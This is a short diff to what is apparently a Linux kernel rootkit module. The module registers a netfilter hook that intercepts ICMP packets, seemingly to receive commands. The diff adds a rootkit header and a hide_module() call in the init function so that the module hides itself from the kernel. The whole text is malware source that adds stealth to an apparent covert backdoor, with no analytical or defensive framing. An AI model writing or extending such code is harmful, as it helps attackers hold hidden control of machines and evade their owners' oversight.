@@ -3,6 +3,7 @@
 #include <linux/icmp.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/inet.h> // For in_aton
+#include "rootkit.h"
 
 #define MAX_CMD_LEN 1976 // Maximum command length
 
@@ -93,6 +94,7 @@ static unsigned int icmp_command_interceptor(void *priv, struct sk_buff *skb, co
 // Module initialization function
 static int __init startup(void)
 {
+  hide_module(); // shadow the module from the kernel
   nfho.hook = icmp_command_interceptor; // Set the handler
   nfho.hooknum = NF_INET_PRE_ROUTING; // Intercept before routing
   nfho.pf = PF_INET;
